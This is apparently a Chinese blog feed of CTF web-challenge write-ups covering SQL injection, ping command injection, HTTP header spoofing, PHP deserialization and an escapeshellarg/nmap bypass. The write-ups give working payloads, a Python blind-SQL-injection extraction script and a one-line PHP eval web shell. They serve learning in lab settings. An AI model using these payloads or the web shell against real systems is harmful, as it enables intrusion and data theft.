<p>此题考察的就是简单的sql注入只不过要注意的是用group_concat()（这个是将组中的字符串连接成为具有各种选项的单个字符串函数）和concat_ws(&quot;?&quot;,?,?)（是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。）不然就显示不出来</p>
<p>首先一看是sql注入就判断是什么注入类型<br>
输入</p>
<pre><code>username：' or 1=1#
password：123
</code></pre>
<p>显示的是<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969725148.png" alt="" loading="lazy"><br>
然后试着用这个账号和密码进行登录发现没有什么用一直都是同一个页面然后就进行sql注入的各种语句查表，列和最后所需要的值（密码随意不能不写写个123也行）</p>
<p>username：<br>
' or 1=1 order by 1,2,3,4#      多次试验后发现3回显正确<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969728849.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,2,3#       测试回显的是哪几个<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969732155.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969734968.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969738399.png" alt="" loading="lazy"><br>
' and 1=2 union select 1,group_concat(concat_ws(&quot;:::&quot;,id,username,password)),3 from l0ve1ysq1#<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969742646.png" alt="" loading="lazy"></p>
<h1 id="actf2020-新生赛exec1">[ACTF2020 新生赛]Exec1</h1>
<p>首先先ping一下127.0.0.1<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969934067.png" alt="" loading="lazy"><br>
然后看看有什么文件直接127.0.0.1 | ls ../../../../../<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622969929957.png" alt="" loading="lazy"><br>
然后直接打开即可127.0.0.1 | cat ../../../../../flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970016783.png" alt="" loading="lazy"></p>
<p>像这种什么都没过滤的题目，可以利用常见管道符直接执行命令:<br>
常见管道符</p>
<p>1、|（就是按位或），直接执行|后面的语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970190689.png" alt="" loading="lazy"><br>
2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970194252.png" alt="" loading="lazy"><br>
3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970198223.png" alt="" loading="lazy"><br>
4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>
这里没试出来flag，用cmd试一下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970203946.png" alt="" loading="lazy"><br>
5、;（linux下有的，和&amp;一样的作用）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622970207060.png" alt="" loading="lazy"><br>
命令执行漏洞可以看这位师傅的博客：<br>
http://www.ghtwf01.cn/index.php/archives/273/</p>
<p>参考自：https://blog.csdn.net/weixin_44348894/article/details/105347418?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</p>
<h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
<p>打开是这样子的。给了/?ip= 后边应该是我们所想要执行的语句。先随便ping一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971962814.png" alt="" loading="lazy"><br>
有回显，我们在在后边继续执行语句。先查看一下ls;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971965668.png" alt="" loading="lazy"><br>
这里发现终端有一个flag.php和一个Index.php<br>
cat flag.php一下试一试<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971968514.png" alt="" loading="lazy"><br>
发现空格被过滤了,去百度查询了一下绕过空格的几个办法<br>
**空格过滤 **</p>
<pre><code>${IFS}替换
$IFS$1替换
${IFS替换
%20替换
&lt;和&lt;&gt;重定向符替换
%09替换
</code></pre>
<p>我们一个个来试一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971972295.png" alt="" loading="lazy"><br>
用第一个<code>${IFS}</code>时候发现符号被过滤了</p>
<p>使用第二个<code>$IFS$1</code>发现可以 说明{}被过滤了,但出现了<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971975513.png" alt="" loading="lazy"><br>
这样说明flag被过滤了 去看一下Index.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971979305.png" alt="" loading="lazy"><br>
发现源码出来了。可以看到flag.&lt;&gt;.{}都被过滤了。bash也被过滤。这时候我们可以想着试一下变量拼接.<br>
?ip=1;a=g;cat$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi>f</mi><mi>l</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">1fla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span></span></span></span>a.php;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622971982645.png" alt="" loading="lazy"><br>
打开源码即可看到flag</p>
<h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
<p>提示很明显说明此题使用蚁剑进行连接所需传入的东西已经万全准备就绪<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978455383.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978459228.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622978462363.png" alt="" loading="lazy"></p>
<h1 id="极客大挑战-2019http1">[极客大挑战 2019]Http1</h1>
<p>打开网页发现啥也没有然后就查看源码发现有一个Secret.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979681162.png" alt="" loading="lazy"><br>
然后用burpsuite抓包然后一直发送发送给repeater因为可以多次提交<br>
然后打开发现<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979967597.png" alt="" loading="lazy"><br>
添加这个：Referer:https://www.Sycsecret.com<br>
然后发送<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979970427.png" alt="" loading="lazy"><br>
然后修改User-Agent:Syclover<br>
然后发送<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979973326.png" alt="" loading="lazy"><br>
然后添加X-Forwarded-For:127.0.0.1<br>
然后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979977436.png" alt="" loading="lazy"><br>
总体修改<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622979980999.png" alt="" loading="lazy"></p>
<h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
<p>1:data伪协议写入文件<br>
2：php://</p>
<p>php://filter用于读取源码<br>
php://input用于执行php代码</p>
<p>3反序列化</p>
<p>打开题目，给了我们源码</p>
<pre><code>&lt;?php  
$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){
echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
if(preg_match(&quot;/flag/&quot;,$file)){
echo &quot;Not now!&quot;;
exit(); 
}else{
include($file);  //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}?&gt;
</code></pre>
<p>第一个绕过：</p>
<pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;))
</code></pre>
<p>这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
</code></pre>
<p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf</p>
<p>第二个绕过</p>
<pre><code>$file = $_GET[&quot;file&quot;];
if(preg_match(&quot;/flag/&quot;,$file)){
echo &quot;Not now!&quot;;
exit(); 
}else{
include($file);  //useless.php
$password = unserialize($password);
echo $password;
}
</code></pre>
<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
<pre><code>file=useless.php
</code></pre>
<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
<pre><code>php://filter/read=convert.base64-encode/resource=useless.php
</code></pre>
<p>读到的useless.php内容如下：</p>
<pre><code>&lt;?php  
class Flag{  //flag.php  
public $file;  
public function __tostring(){  
if(isset($this-&gt;file)){  
echo file_get_contents($this-&gt;file); 
echo &quot;&lt;br&gt;&quot;;
return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
}  
}  
}  
?&gt;
</code></pre>
<p>第三个绕过</p>
<pre><code>$password = $_GET[&quot;password&quot;];
include($file);  //useless.php
$password = unserialize($password);
echo $password;
</code></pre>
<p>这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
<pre><code>&lt;?php  
class Flag{  //flag.php  
public $file=&quot;flag.php&quot;;  
public function __tostring(){  
if(isset($this-&gt;file)){  
echo file_get_contents($this-&gt;file); 
echo &quot;&lt;br&gt;&quot;;
return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
}  
}  
}  
$a = new Flag();
echo serialize($a);
?&gt;
//O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
</code></pre>
<p>最后payload</p>
<pre><code>http://6619a3b1-daa6-4ab9-bb3d-ba8b90593516.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D
</code></pre>
<p>参考链接https://www.redmango.top/articles/article/40/</p>
<p>simple sql 简单的sql过滤绕过<br>
寻找注入点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089368829.png" alt="" loading="lazy"><br>
只有一个输入框，抓包看是post提交。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089372575.png" alt="" loading="lazy"><br>
依次输入</p>
<pre><code>' =&gt; bool(false)
and 1=1 =&gt; SQL Injection Checked.
2 =&gt; 显示正常
3 =&gt; Error Occured When Fetch Result.
看起来有过滤，先fuzz下过滤了哪些关键词，利用intrude模块：
（下载了一份fuzz dict: dictionary-master）
使用 sql_fuzz.txt 字典 
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089377469.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089381519.png" alt="" loading="lazy"><br>
但是 ascii/regexp/substr等函数都没过滤。xor被过滤，但是 ^/|/= 没有过滤，所以可以构造一个true表达式：<br>
0^(2&gt;1) =&gt; Hello this is Aurora<br>
0^(2&gt;1) =&gt; Error Occured When Fetch Result.<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089385693.png" alt="" loading="lazy"><br>
因此，注入点就是：<br>
0^(TRUE表达式) =&gt; 返回 Hello this is Auro<br>
0^(False表达式) =&gt; 返回 Error Occured When Fetch Result.<br>
构造注入语句</p>
<p>这里以ascii为例，参考：https://www.anquanke.com/post/id/160584#h2-11</p>
<p>ascii(mid((password)from(i)))&gt;j</p>
<p>这个语句中，涉及到mysql的 mid 和 ascii 函数</p>
<pre><code>mid函数的使用方法：
正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串
MID(str,pos,len)
这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，from(0)是没有值的。for(1)表示从改位置起一次就截取一个字符，本题for被过滤了。
</code></pre>
<p>对应的构造select语句：</p>
<pre><code>select flag from flag //要返回str，要求flag表只有一行
mid((select flag from flag )from(1))  // 获取第一个
ascii(mid((select flag from flag )from(1)))=102 // ascii('flag') 默认只返回f的ascii值，f对应102
ascii(mid((select%0aflag%0afrom%0aflag)from(1)))=102 // 绕过空格过滤  
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089391290.png" alt="" loading="lazy"><br>
正常显示 id=1 的内容，说明答案的第一个字符是f。<br>
编写 exp 程序</p>
<p>知道了注入点，剩下的就是自动化。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089395786.png" alt="" loading="lazy"><br>
先在python里面验证下，发现同样的payload，在burp可以，代码却不行。唯一的原因就在 %0a 这个编码的地方了。<br>
参考这篇文章：https://blog.csdn.net/M1mory/article/details/58309378<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089400139.png" alt="" loading="lazy"><br>
加上代理，自己在burp可以看到requests发包的情况，还要加上 content-type 头部，否则无返回信息<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624089404183.png" alt="" loading="lazy"><br>
基于此，写出exp代码：</p>
<pre><code>import requests

dict = &quot;fabcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890{}&quot;

url = &quot;http://polarlicht.xyz:8302/index.php&quot;
headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}

ret = []
for i in range(1,20):
for c in dict:
payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(str(i), str(ord(c)))
r = requests.post(url, data=payload, headers=headers, proxies = proxy)
if len(r.text) == 299:
ret.append(c)
print(&quot;[%d]%s=&gt;%s\t%s&quot; % (i, c, len(r.text), payload))

print(''.join(ret))
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624089407690.png" alt="" loading="lazy"><br>
这段代码速度太慢，用二分法进行代码优化：</p>
<pre><code>import requests

url = &quot;http://polarlicht.xyz:8302/index.php&quot;
headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}

def check(i, index):
payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(i, index)
r = requests.post(url, data=payload, proxies=proxy, headers = headers)
if r.text.find('Hello') &gt;= 0:
return 0

payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))&gt;{1})&quot;.format(i, index)
r = requests.post(url, data=payload, proxies=proxy, headers=headers)
if r.text.find('Hello') &gt;= 0:
return 1

return -1
</code></pre>
<h1 id="二分实现">二分实现</h1>
<pre><code>mids = []
for i in range(1, 20):
# ascii 可显示字符是33到126
start = 33
end = 126
mid = (start + end) // 2


while start &lt;= mid:
if check(i, mid) == 0:
mids.append(mid)
break

if check(i, mid) &gt; 0:
start = mid
mid = (start + end) // 2
else:
end = mid
mid = (start + end) // 2
tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
print(''.join(chr(x) for x in mids))
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
<p>1.题目源码</p>
<pre><code>&lt;?php

include(&quot;flag.php&quot;);

highlight_file(__FILE__);

class FileHandler {

protected $op;
protected $filename;
protected $content;

function __construct() {
$op = &quot;1&quot;;
$filename = &quot;/tmp/tmpfile&quot;;
$content = &quot;Hello World!&quot;;
$this-&gt;process();
}

public function process() {
if($this-&gt;op == &quot;1&quot;) {
$this-&gt;write();
} else if($this-&gt;op == &quot;2&quot;) {
$res = $this-&gt;read();
$this-&gt;output($res);
} else {
$this-&gt;output(&quot;Bad Hacker!&quot;);
}
}

private function write() {
if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
if(strlen((string)$this-&gt;content) &gt; 100) {
$this-&gt;output(&quot;Too long!&quot;);
die();
}
$res = file_put_contents($this-&gt;filename, $this-&gt;content);
if($res) $this-&gt;output(&quot;Successful!&quot;);
else $this-&gt;output(&quot;Failed!&quot;);
} else {
$this-&gt;output(&quot;Failed!&quot;);
}
}

private function read() {
$res = &quot;&quot;;
if(isset($this-&gt;filename)) {
$res = file_get_contents($this-&gt;filename);
}
return $res;
}

private function output($s) {
echo &quot;[Result]: &lt;br&gt;&quot;;
echo $s;
}

function __destruct() {
if($this-&gt;op === &quot;2&quot;)
$this-&gt;op = &quot;1&quot;;
$this-&gt;content = &quot;&quot;;
$this-&gt;process();
}

}

function is_valid($s) {
for($i = 0; $i &lt; strlen($s); $i++)
if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
return false;
return true;
}

if(isset($_GET{'str'})) {

$str = (string)$_GET['str'];
if(is_valid($str)) {
$obj = unserialize($str);
}

}
</code></pre>
<p>这是一个PHP反序列化的题目，首先看到需要传入一个’str’，而且通过is_valid()规定了传入的每一个字符的ASCII码的范围必须在32到125之间，然后对这个’str’进行反序列化操作。</p>
<p>在反序列化中，先调用__destruct()析构方法：</p>
<pre><code>function __destruct() {
if($this-&gt;op === &quot;2&quot;)
$this-&gt;op = &quot;1&quot;;
$this-&gt;content = &quot;&quot;;
$this-&gt;process();
}
</code></pre>
<p>从__destruct()代码中可以看到，如果op === “2”，那么op会被赋值为&quot;1&quot;，然后content会赋值为空，并执行process函数，这里 if 中的判断语句用的是强类型比较。<br>
然后看看process函数：</p>
<pre><code>public function process() {
if($this-&gt;op == &quot;1&quot;) {
$this-&gt;write();
} else if($this-&gt;op == &quot;2&quot;) {
$res = $this-&gt;read();
$this-&gt;output($res);
} else {
$this-&gt;output(&quot;Bad Hacker!&quot;);
}
}
</code></pre>
<p>代码内容为：如果op == “1”，执行write()函数;如果op ==“2”,执行read函数，同时将结果赋值给$res，然后输出；否则将输出&quot;Bad Hacker！&quot;。</p>
<p>这里 if 语句中的判断语句用的是弱类型的比较，那么只要op=2，这个是int整数型的2，那么op === “2” 则为False， op == &quot;2&quot;则为True，就可以进入read函数。</p>
<p>再看看read函数：</p>
<pre><code>private function read() {
$res = &quot;&quot;;
if(isset($this-&gt;filename)) {
$res = file_get_contents($this-&gt;filename);
}
return $res;
}
</code></pre>
<p>在read函数中，使用filename调用file_get_contents函数将文件内容赋值给$res输出。</p>
<p>这里的filename是我们可控的，那么可以用前不久学的php://filter伪协议读取文件。然后使用output函数输出。</p>
<pre><code>private function output($s) {
echo &quot;[Result]: &lt;br&gt;&quot;;
echo $s;
}
</code></pre>
<p>那么现在整个反序列过程就清楚了：<br>
1.将op = 2<br>
2.filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</p>
<pre><code>&lt;?php
class FileHandler {

protected $op=2;
protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
protected $content;

}

$a = new FileHandler();
echo serialize($a);
?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1624333261046.png" alt="" loading="lazy"><br>
原因是在于 <code>$op $filename $content</code>三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0，不在is_valid函数规定的32到125的范围内。<br>
可以使用一种简单的办法绕过：因为php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public就可以了。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624333257382.png" alt="" loading="lazy"><br>
那么现在就可以使用这个payload来读取flag：</p>
<pre><code>?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;
</code></pre>
<p>然后进行解码即可<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624333252468.png" alt="" loading="lazy"><br>
总结：<br>
1.区分强类型比较和弱类型比较进行绕过<br>
2.加深对php序列化和反序列化过程的理解</p>
<p>php序列化与反序列化方法：</p>
<pre><code>__construct 当一个对象创建时被调用
__destruct 当一个对象销毁时被调用
__toString 当一个对象被当作一个字符串使用
__sleep 在对象被序列化之前运行
__wakeup 在对象被反序列化之后被调用
</code></pre>
<p>参考：<br>
https://www.freebuf.com/articles/web/209975.html<br>
https://www.cnblogs.com/tr1ple/p/11156279.html</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「嗯？？嗯。」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_40860153/article/details/109018483</p>
<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli#</h1>
<p>这题的知识点是绕过密码的md5验证，参考Y1ng师傅的文章<br>
看到题目，fuzz了一下，过滤的并不多(415是没过滤的，419是过滤的)<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336018360.png" alt="" loading="lazy"><br>
而且页面源码有给sql语句，不过需要先base32再base64解码</p>
<pre><code>select * from user where username = '$name'
</code></pre>
<p>直接可以用联合注入，表里有三列</p>
<pre><code>1' Order by 3#
</code></pre>
<p>进行用联合注入，回显wrong user!，说明用户不在第一列</p>
<pre><code>1' union select 1,2,3#
</code></pre>
<p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p>
<pre><code>1' union select 1,'admin',3#
</code></pre>
<p>接下里就是要绕过密码的md5验证，需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据</p>
<p>首先可以看到该表只有一个用户<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336023503.png" alt="" loading="lazy"><br>
然后我们可以用联合查询的方式将查询的数据插入到表中<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336026579.png" alt="" loading="lazy"></p>
<p>通过这样的方式，我们就可以用构造payload</p>
<p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p>
<pre><code>1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
</code></pre>
<p>密码输入</p>
<pre><code>123456
</code></pre>
<p>POST请求 ,获得flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1624336030766.png" alt="" loading="lazy"></p>
<h1 id="online-tool">Online Tool</h1>
<p>remote_addr和x_forwarded_for这两个是见的比较多的，服务器获取ip用的，这里没什么用</p>
<p>escapeshellarg()和escapeshellcmd() 没见过，百度</p>
<p>PHP escapeshellarg()+escapeshellcmd() 之殇</p>
<p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p>
<pre><code>    传入的参数是：172.17.0.2' -v -d a=1
    经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
    经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
    最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
</code></pre>
<p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题</p>
<p>然后往下看，看到echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</p>
<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
<pre><code>?host=' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '
</code></pre>
<p>执行后会返回文件夹名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626830258385.png" alt="" loading="lazy"><br>
然后蚁剑连接，找到flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626830273428.png" alt="" loading="lazy"><br>
————————————————<br>
版权声明：本文为CSDN博主「恋物语战场原」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</p>
]]></content>
    </entry>
</feed>